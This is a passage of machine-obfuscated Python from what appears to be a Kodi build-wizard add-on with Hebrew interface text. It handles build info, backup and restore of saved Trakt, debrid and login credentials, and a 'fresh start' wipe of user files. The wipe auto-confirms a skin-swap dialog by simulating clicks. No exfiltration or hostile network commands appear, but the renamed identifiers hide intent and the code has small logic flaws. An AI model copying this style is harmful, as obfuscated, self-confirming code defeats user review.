	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:5317
		wiz .skinToDefault ()#line:5318
	wiz .restoreLocal (OO0OO0OO0O00OOOOO )#line:5319
def restoreextit (O00O00O0O0OO0O00O ):#line:5321
	if O00O00O0O0OO0O00O =='build':#line:5322
		OO0OOOO0OOOO000OO =freshStart ('restore')#line:5323
		if OO0OOOO0OOOO000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5324
	wiz .restoreExternal (O00O00O0O0OO0O00O )#line:5325
def buildInfo (OO0O0000O0000OOOO ):#line:5327
	if wiz .workingURL (SPEEDFILE )==True :#line:5328
		if wiz .checkBuild (OO0O0000O0000OOOO ,'url'):#line:5329
			OO0O0000O0000OOOO ,O000OO00OO0OO0OOO ,OO0OOOO0O0O0O0O00 ,OOO0000OO0OO00O00 ,OOO0OO0OO000O0O0O ,O0000O0000OOO0OOO ,O00OOO0OOO0O000OO ,O00O000OO0OO0OOOO ,O0O000OO000000O0O ,OO0OOOOO0O000O000 ,O00OOOOO00O0OOOO0 =wiz .checkBuild (OO0O0000O0000OOOO ,'all')#line:5330
			OO0OOOOO0O000O000 ='Yes'if OO0OOOOO0O000O000 .lower ()=='yes'else 'No'#line:5331
			OO00OO0O0000O00OO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0000O0000OOOO )#line:5332
			OO00OO0O0000O00OO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OO00OO0OO0OOO )#line:5333
			if not O0000O0000OOO0OOO =="http://":#line:5334
				OOOOOO0O0O000O0OO =wiz .themeCount (OO0O0000O0000OOOO ,False )#line:5335
				OO00OO0O0000O00OO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOOOO0O0O000O0OO ))#line:5336
			OO00OO0O0000O00OO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO0OO000O0O0O )#line:5337
			OO00OO0O0000O00OO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OOOOO0O000O000 )#line:5338
			OO00OO0O0000O00OO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOOOO00O0OOOO0 )#line:5339
			wiz .TextBox (ADDONTITLE ,OO00OO0O0000O00OO )#line:5340
		else :wiz .log ("Invalid Build Name!")#line:5341
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5342
def buildVideo (OOOOOOO0O0O0O000O ):#line:5344
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5345
	if wiz .workingURL (SPEEDFILE )==True :#line:5346
		OO0OO00O00O0OOOOO =wiz .checkBuild (OOOOOOO0O0O0O000O ,'preview')#line:5347
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOOOOO0O0O0O000O )#line:5348
		if OO0OO00O00O0OOOOO and not OO0OO00O00O0OOOOO =='http://':playVideo (OO0OO00O00O0OOOOO )#line:5349
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOOOOO0O0O0O000O )#line:5350
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5351
def dependsList (O00OOO0OO0000O00O ):#line:5353
	O0000O00OOOOOOOOO =os .path .join (ADDONS ,O00OOO0OO0000O00O ,'addon.xml')#line:5354
	if os .path .exists (O0000O00OOOOOOOOO ):#line:5355
		OO00OOOO0OO0O0O0O =open (O0000O00OOOOOOOOO ,mode ='r');OO000O00O0O0O00OO =OO00OOOO0OO0O0O0O .read ();OO00OOOO0OO0O0O0O .close ();#line:5356
		O000OOO0O00O0O0OO =wiz .parseDOM (OO000O00O0O0O00OO ,'import',ret ='addon')#line:5357
		O000O0OO0O00OOOO0 =[]#line:5358
		for O0OO00OOO0O0000O0 in O000OOO0O00O0O0OO :#line:5359
			if not 'xbmc.python'in O0OO00OOO0O0000O0 :#line:5360
				O000O0OO0O00OOOO0 .append (O0OO00OOO0O0000O0 )#line:5361
		return O000O0OO0O00OOOO0 #line:5362
	return []#line:5363
def manageSaveData (OOOO0O00OO0O00O0O ):#line:5365
	if OOOO0O00OO0O00O0O =='import':#line:5366
		O0OO000OOO0O00000 =os .path .join (ADDONDATA ,'temp')#line:5367
		if not os .path .exists (O0OO000OOO0O00000 ):os .makedirs (O0OO000OOO0O00000 )#line:5368
		O00OOOO000O00O00O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5369
		if not O00OOOO000O00O00O .endswith ('.zip'):#line:5370
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5371
			return #line:5372
		O0O0OOO00O0O0O0OO =os .path .join (MYBUILDS ,'SaveData.zip')#line:5373
		O00OOOO0O0OOO0OOO =xbmcvfs .copy (O00OOOO000O00O00O ,O0O0OOO00O0O0O0OO )#line:5374
		wiz .log ("%s"%str (O00OOOO0O0OOO0OOO ))#line:5375
		extract .all (xbmc .translatePath (O0O0OOO00O0O0O0OO ),O0OO000OOO0O00000 )#line:5376
		OO0O0O0OO00OO0O00 =os .path .join (O0OO000OOO0O00000 ,'trakt')#line:5377
		O00O0OOO0OOOO0OO0 =os .path .join (O0OO000OOO0O00000 ,'login')#line:5378
		O0OOO00000OOO0O0O =os .path .join (O0OO000OOO0O00000 ,'debrid')#line:5379
		OOOOOOO0O0O0OOOO0 =0 #line:5380
		if os .path .exists (OO0O0O0OO00OO0O00 ):#line:5381
			OOOOOOO0O0O0OOOO0 +=1 #line:5382
			O0000OO00OO0OOO00 =os .listdir (OO0O0O0OO00OO0O00 )#line:5383
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5384
			for O00O000000OO0O00O in O0000OO00OO0OOO00 :#line:5385
				O000000O000O00OOO =os .path .join (traktit .TRAKTFOLD ,O00O000000OO0O00O )#line:5386
				O000O0O0OOOOOO000 =os .path .join (OO0O0O0OO00OO0O00 ,O00O000000OO0O00O )#line:5387
				if os .path .exists (O000000O000O00OOO ):#line:5388
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000000OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5389
					else :os .remove (O000000O000O00OOO )#line:5390
				shutil .copy (O000O0O0OOOOOO000 ,O000000O000O00OOO )#line:5391
			traktit .importlist ('all')#line:5392
			traktit .traktIt ('restore','all')#line:5393
		if os .path .exists (O00O0OOO0OOOO0OO0 ):#line:5394
			OOOOOOO0O0O0OOOO0 +=1 #line:5395
			O0000OO00OO0OOO00 =os .listdir (O00O0OOO0OOOO0OO0 )#line:5396
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5397
			for O00O000000OO0O00O in O0000OO00OO0OOO00 :#line:5398
				O000000O000O00OOO =os .path .join (loginit .LOGINFOLD ,O00O000000OO0O00O )#line:5399
				O000O0O0OOOOOO000 =os .path .join (O00O0OOO0OOOO0OO0 ,O00O000000OO0O00O )#line:5400
				if os .path .exists (O000000O000O00OOO ):#line:5401
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000000OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5402
					else :os .remove (O000000O000O00OOO )#line:5403
				shutil .copy (O000O0O0OOOOOO000 ,O000000O000O00OOO )#line:5404
			loginit .importlist ('all')#line:5405
			loginit .loginIt ('restore','all')#line:5406
		if os .path .exists (O0OOO00000OOO0O0O ):#line:5407
			OOOOOOO0O0O0OOOO0 +=1 #line:5408
			O0000OO00OO0OOO00 =os .listdir (O0OOO00000OOO0O0O )#line:5409
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5410
			for O00O000000OO0O00O in O0000OO00OO0OOO00 :#line:5411
				O000000O000O00OOO =os .path .join (debridit .REALFOLD ,O00O000000OO0O00O )#line:5412
				O000O0O0OOOOOO000 =os .path .join (O0OOO00000OOO0O0O ,O00O000000OO0O00O )#line:5413
				if os .path .exists (O000000O000O00OOO ):#line:5414
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O000000OO0O00O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5415
					else :os .remove (O000000O000O00OOO )#line:5416
				shutil .copy (O000O0O0OOOOOO000 ,O000000O000O00OOO )#line:5417
			debridit .importlist ('all')#line:5418
			debridit .debridIt ('restore','all')#line:5419
		wiz .cleanHouse (O0OO000OOO0O00000 )#line:5420
		wiz .removeFolder (O0OO000OOO0O00000 )#line:5421
		os .remove (O0O0OOO00O0O0O0OO )#line:5422
		if OOOOOOO0O0O0OOOO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5423
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5424
	elif OOOO0O00OO0O00O0O =='export':#line:5425
		OO00O00O0OO00O0OO =xbmc .translatePath (MYBUILDS )#line:5426
		O00000O0OO0000O0O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5427
		traktit .traktIt ('update','all')#line:5428
		loginit .loginIt ('update','all')#line:5429
		debridit .debridIt ('update','all')#line:5430
		O00OOOO000O00O00O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5431
		O00OOOO000O00O00O =xbmc .translatePath (O00OOOO000O00O00O )#line:5432
		O0O000O0OO0O000O0 =os .path .join (OO00O00O0OO00O0OO ,'SaveData.zip')#line:5433
		OO0O000OO00O000OO =zipfile .ZipFile (O0O000O0OO0O000O0 ,mode ='w')#line:5434
		for OO0OO0OO000OOO0O0 in O00000O0OO0000O0O :#line:5435
			if os .path .exists (OO0OO0OO000OOO0O0 ):#line:5436
				O0000OO00OO0OOO00 =os .listdir (OO0OO0OO000OOO0O0 )#line:5437
				for OOO00O00OO0OO000O in O0000OO00OO0OOO00 :#line:5438
					OO0O000OO00O000OO .write (os .path .join (OO0OO0OO000OOO0O0 ,OOO00O00OO0OO000O ),os .path .join (OO0OO0OO000OOO0O0 ,OOO00O00OO0OO000O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5439
		OO0O000OO00O000OO .close ()#line:5440
		if O00OOOO000O00O00O ==OO00O00O0OO00O0OO :#line:5441
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O0OO0O000O0 ))#line:5442
		else :#line:5443
			try :#line:5444
				xbmcvfs .copy (O0O000O0OO0O000O0 ,os .path .join (O00OOOO000O00O00O ,'SaveData.zip'))#line:5445
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O00OOOO000O00O00O ,'SaveData.zip')))#line:5446
			except :#line:5447
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000O0OO0O000O0 ))#line:5448
def freshStart (install =None ,over =False ):#line:5453
	if USERNAME =='':#line:5454
		ADDON .openSettings ()#line:5455
		sys .exit ()#line:5456
	O0O0O0OOOO000000O =(SPEEDFILE )#line:5457
	(O0O0O0OOOO000000O )#line:5458
	O0OO0OOOOOO00000O =(wiz .workingURL (O0O0O0OOOO000000O ))#line:5459
	(O0OO0OOOOOO00000O )#line:5460
	if KEEPTRAKT =='true':#line:5461
		traktit .autoUpdate ('all')#line:5462
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5463
	if KEEPREAL =='true':#line:5464
		debridit .autoUpdate ('all')#line:5465
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5466
	if KEEPLOGIN =='true':#line:5467
		loginit .autoUpdate ('all')#line:5468
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5469
	if over ==True :OO00OO0OOO00OO0OO =1 #line:5470
	elif install =='restore':OO00OO0OOO00OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5471
	elif install :OO00OO0OOO00OO0OO =1 #line:5472
	else :OO00OO0OOO00OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5473
	if OO00OO0OOO00OO0OO :#line:5474
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5475
			OOO00O0000OO0000O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5476
			skinSwitch .swapSkins (OOO00O0000OO0000O )#line:5479
			OOO0O0OO000OO000O =0 #line:5480
			xbmc .sleep (1000 )#line:5481
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O0OO000OO000O <150 :#line:5482
				OOO0O0OO000OO000O +=1 #line:5483
				xbmc .sleep (1000 )#line:5484
				wiz .ebi ('SendAction(Select)')#line:5485
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5486
				wiz .ebi ('SendClick(11)')#line:5487
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5488
			xbmc .sleep (1000 )#line:5489
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5490
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5491
			return #line:5492
		wiz .addonUpdates ('set')#line:5493
		O00OO0O0OO0O00OOO =os .path .abspath (HOME )#line:5494
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5495
		O0O00OO0OO000OO0O =sum ([len (OOO0000OOOOO000OO )for O0OOOO0O000O0O0O0 ,OOO0O0OO0OO00OO0O ,OOO0000OOOOO000OO in os .walk (O00OO0O0OO0O00OOO )]);OO000OO0O0000OO0O =0 #line:5496
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5497
		EXCLUDES .append ('My_Builds')#line:5498
		EXCLUDES .append ('archive_cache')#line:5499
		EXCLUDES .append ('script.module.requests')#line:5500
		EXCLUDES .append ('script.module.certifi')#line:5501
		EXCLUDES .append ('script.module.chardet')#line:5502
		EXCLUDES .append ('script.module.idna')#line:5503
		EXCLUDES .append ('script.module.urllib3')#line:5504
		if KEEPREPOS =='true':#line:5505
			OOOOO0OO0000000OO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5506
			for OO0O0O000O000O00O in OOOOO0OO0000000OO :#line:5507
				O0OOO0O0O00000O0O =os .path .split (OO0O0O000O000O00O [:-1 ])[1 ]#line:5508
				if not O0OOO0O0O00000O0O ==EXCLUDES :#line:5509
					EXCLUDES .append (O0OOO0O0O00000O0O )#line:5510
		if KEEPSUPER =='true':#line:5511
			EXCLUDES .append ('plugin.program.super.favourites')#line:5512
		if KEEPMOVIELIST =='true':#line:5513
			EXCLUDES .append ('plugin.video.metalliq')#line:5514
		if KEEPMOVIELIST =='true':#line:5515
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5516
		if KEEPADDONS =='true':#line:5517
			EXCLUDES .append ('addons')#line:5518
		if KEEPTELEMEDIA =='true':#line:5519
			EXCLUDES .append ('plugin.video.telemedia')#line:5520
		EXCLUDES .append ('plugin.video.elementum')#line:5525
		EXCLUDES .append ('script.elementum.burst')#line:5526
		EXCLUDES .append ('script.elementum.burst-master')#line:5527
		EXCLUDES .append ('plugin.video.quasar')#line:5528
		EXCLUDES .append ('script.quasar.burst')#line:5529
		EXCLUDES .append ('skin.estuary')#line:5530
		if KEEPWHITELIST =='true':#line:5533
			O0OOOO0O0OO000OO0 =''#line:5534
			OO0OOOOOO000O0OOO =wiz .whiteList ('read')#line:5535
			if len (OO0OOOOOO000O0OOO )>0 :#line:5536
				for OO0O0O000O000O00O in OO0OOOOOO000O0OOO :#line:5537
					try :O00O000000OOOO0OO ,OOOO0O0OOOO0O0OOO ,OOOO000O0O0OO0OO0 =OO0O0O000O000O00O #line:5538
					except :pass #line:5539
					if OOOO000O0O0OO0OO0 .startswith ('pvr'):O0OOOO0O0OO000OO0 =OOOO0O0OOOO0O0OOO #line:5540
					OO0OO00O00O0000OO =dependsList (OOOO000O0O0OO0OO0 )#line:5541
					for O0000OO0O0OO0OOO0 in OO0OO00O00O0000OO :#line:5542
						if not O0000OO0O0OO0OOO0 in EXCLUDES :#line:5543
							EXCLUDES .append (O0000OO0O0OO0OOO0 )#line:5544
						OO0O0OO000O0OOO00 =dependsList (O0000OO0O0OO0OOO0 )#line:5545
						for OO000OO0O000O000O in OO0O0OO000O0OOO00 :#line:5546
							if not OO000OO0O000O000O in EXCLUDES :#line:5547
								EXCLUDES .append (OO000OO0O000O000O )#line:5548
					if not OOOO000O0O0OO0OO0 in EXCLUDES :#line:5549
						EXCLUDES .append (OOOO000O0O0OO0OO0 )#line:5550
				if not O0OOOO0O0OO000OO0 =='':wiz .setS ('pvrclient',OOOO000O0O0OO0OO0 )#line:5551
		if wiz .getS ('pvrclient')=='':#line:5552
			for OO0O0O000O000O00O in EXCLUDES :#line:5553
				if OO0O0O000O000O00O .startswith ('pvr'):#line:5554
					wiz .setS ('pvrclient',OO0O0O000O000O00O )#line:5555
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5556
		OOO00OO0O0O0OO000 =wiz .latestDB ('Addons')#line:5557
		for OOOOO000OOOOO0OO0 ,OOOOO0O0O00OOO0O0 ,OO00O0OO0O00OO00O in os .walk (O00OO0O0OO0O00OOO ,topdown =True ):#line:5558
			OOOOO0O0O00OOO0O0 [:]=[OO00O00OO0O0OO0OO for OO00O00OO0O0OO0OO in OOOOO0O0O00OOO0O0 if OO00O00OO0O0OO0OO not in EXCLUDES ]#line:5559
			for O00O000000OOOO0OO in OO00O0OO0O00OO00O :#line:5560
				OO000OO0O0000OO0O +=1 #line:5561
				OOOO000O0O0OO0OO0 =OOOOO000OOOOO0OO0 .replace ('/','\\').split ('\\')#line:5562
				OOO0O0OO000OO000O =len (OOOO000O0O0OO0OO0 )-1 #line:5564
				if OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5565
				elif O00O000000OOOO0OO =='MyVideos99.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5566
				elif O00O000000OOOO0OO =='MyVideos107.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5567
				elif O00O000000OOOO0OO =='MyVideos116.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5568
				elif O00O000000OOOO0OO =='MyVideos99.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5569
				elif O00O000000OOOO0OO =='MyVideos107.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5570
				elif O00O000000OOOO0OO =='MyVideos116.db'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5571
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5572
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5573
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'skin.Premium.mod'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5574
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5575
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'skin.phenomenal'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5576
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5577
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'skin.titan'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5579
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5580
				elif O00O000000OOOO0OO =='sources.xml'and OOOO000O0O0OO0OO0 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5582
				elif O00O000000OOOO0OO =='quicknav.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5585
				elif O00O000000OOOO0OO =='x1101.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5586
				elif O00O000000OOOO0OO =='b-srtym-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5587
				elif O00O000000OOOO0OO =='x1102.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5588
